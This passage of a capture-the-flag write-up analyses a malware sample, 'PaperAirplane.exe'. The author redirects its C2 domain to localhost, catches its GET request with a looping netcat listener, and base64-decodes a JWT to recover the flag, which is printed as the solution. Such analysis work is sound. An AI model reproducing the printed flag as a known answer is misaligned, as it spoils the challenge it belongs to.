So I uploaded this `.exe` to `IDA`, however after a fewscrolls and couple hours I dont think that great idea. I try new way by loading this file to a debugger `.x64` for debugging but Im not really familiar with this tool so I cant do anything neither.

And then I remember I got the port and the name of the domain the C2 server will send request, so I config my hosts file with `Notepad.exe` as Admin, add this line to the bottom of the file: `127.0.0.1    bksec.airlines`,
so that the malware when running will request to my desktop, then I use `nc -lp 3636` since the malware need the right port to return request. After setup, I ran the `PaperAirplane.exe` and in the terminal which i used `nc` before, the connection was successfull.

![](Screenshot_2026-03-08_080127.png)

However, the malware sent a `\GET` request, therefore it will wait the server until received the `HTTP/x.x 200 OK` or similar. So I upgraded the `nc` a little for it always auto reply with a `HTTP/1.1 200 OK` for every packet:
```bash
while true; do echo -e "HTTP/1.1 200 OK\r\n\r\n" | nc -lvnp 3636; done
```
then I clicked on the `.exe` again and in the nc terminal, there is a `\GET` request, look at the authorization line: `Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0b29sIjoiUGFwZXJBaXJwbGFuZSIsImNhbXBhaWduX2lkIjoiT3BlcmF0aW9uX1RUViIsImF1dGgiOiJCS1NFQ3tzcXVpcnJlMV9ib3R0bDNfMG5fdGhlX2ExcnBsYW5lP30ifQ.hZm4H2Vsd7WrCvbodb7IoTvxqnm209_IFd2R-yVMzpk` looked like a Base64 strings so I use 
```bash
echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0b29sIjoiUGFwZXJBaXJwbGFuZSIsImNhbXBhaWduX2lkIjoiT3BlcmF0aW9uX1RUViIsImF1dGgiOiJCS1NFQ3tzcXVpcnJlMV9ib3R0bDNfMG5fdGhlX2ExcnBsYW5lP30ifQ.hZm4H2Vsd7WrCvbodb7IoTvxqnm209_IFd2R-yVMzpk" | base64 -d


{"alg":"HS256","typ":"JWT"}{"tool":"PaperAirplane","campaign_id":"Operation_TTV","auth":"BKSEC{squirre1_bottl3_0n_the_a1rplane?}"}YöVÇ{Z°¯n[ì¿§m= WvG%LÎ
```

![](Screenshot_2026-03-08_080547.png)

## 3. Solution ##
`The flag is: BKSEC{squirre1_bottl3_0n_the_a1rplane?}`